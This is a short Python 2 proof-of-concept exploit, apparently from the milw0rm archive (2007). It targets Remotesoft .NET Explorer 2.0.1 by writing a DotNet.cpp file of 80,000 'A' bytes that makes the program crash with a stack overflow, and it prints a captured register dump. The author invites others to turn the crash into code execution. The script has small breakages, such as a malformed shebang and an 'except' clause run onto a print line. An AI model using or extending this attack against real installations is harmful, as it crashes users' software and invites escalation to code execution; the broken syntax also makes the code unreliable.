#/usr/bin/ python
print "--------------------------------------------------------------"
print "Remotesoft .NET Explorer 2.0.1 Stack Overflow"
print "url: http://www.remotesoft.com/"
print "author: shinnai"
print "mail: shinnai[at]autistici[dot]org"
print "site: http://shinnai.altervista.org"
print "soundtrack: Firestarter (Prodigy)"
print "--------------------------------------------------------------"

try:
   char = "\x41" * 80000

   out_file = open('DotNet.cpp','wb')
   out_file.write(char)
   out_file.close()

   print "File succesfully created!\n\n"
   print "Here is a dump:"
   print "pid=0820 tid=08C0  EXCEPTION (unhandled)"
   print "----------------------------------------------------------------"
   print "Exception C00000FD (STACK_OVERFLOW)"
   print "----------------------------------------------------------------"
   print "EAX=00003551: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??"
   print "EBX=0012FA78: 01 00 00 00 00 00 00 00-00 77 05 00 00 00 00 00"
   print "ECX=00E523F0: 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41"
   print "EDX=782279A8: 55 8B EC FF 75 20 FF 75-1C FF 75 18 FF 75 14 FF"
   print "ESP=00032FE8: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00"
   print "EBP=0003351C: 48 35 03 00 76 D4 E4 77-84 12 01 5A 01 00 00 00"
   print "ESI=0000028B: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??"
   print "EDI=0000005E: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??"
   print "EIP=77E4885F: 53 8B 5D 14 F6 C7 20 89-45 FC 8B 45 08 89 8D E8"
   print "           --> PUSH EBX"
   print "----------------------------------------------------------------\n"
   print "To see application crash, encrease the number of characters."
   print "I was unable to execute arbitrary code but I think someone better"
   print "than me can succesfully exploit it :P\n" except:
   print "Unable to create file!"

# milw0rm.com [2007-02-02]
